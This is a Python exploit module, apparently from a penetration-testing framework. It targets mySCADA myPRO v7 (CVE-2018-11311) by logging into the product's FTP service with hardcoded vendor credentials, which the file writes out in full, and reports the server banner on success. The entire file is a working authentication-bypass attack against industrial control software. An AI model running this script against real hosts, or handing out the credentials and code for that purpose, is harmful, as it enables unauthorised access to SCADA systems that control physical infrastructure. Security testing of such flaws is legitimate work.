from ftplib import FTP
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target: str, port: int = 2121):
    """
    Exploit Title: mySCADA myPRO v7 Hardcoded FTP Credentials
    CVE: CVE-2018-11311
    Author: Emre ÖVÜNÇ
    Affected Version: v7.0.45
    Tested on: Windows/Linux
    Exploit Type: Auth Bypass via FTP
    """

    username = "myscada"
    password = "Vikuk63"

    try:
        logger.info(f"[*] Attempting FTP login to {target}:{port} with hardcoded credentials...")
        ftp = FTP()
        ftp.connect(target, port, timeout=5)
        ftp.login(username, password)

        banner = ftp.getwelcome()
        logger.success(f"[+] Logged in to FTP on {target}:{port} — Banner: {banner}")
        ftp.quit()
        return True

    except Exception as e:
        logger.error(f"[!] FTP login failed: {e}")
        return False
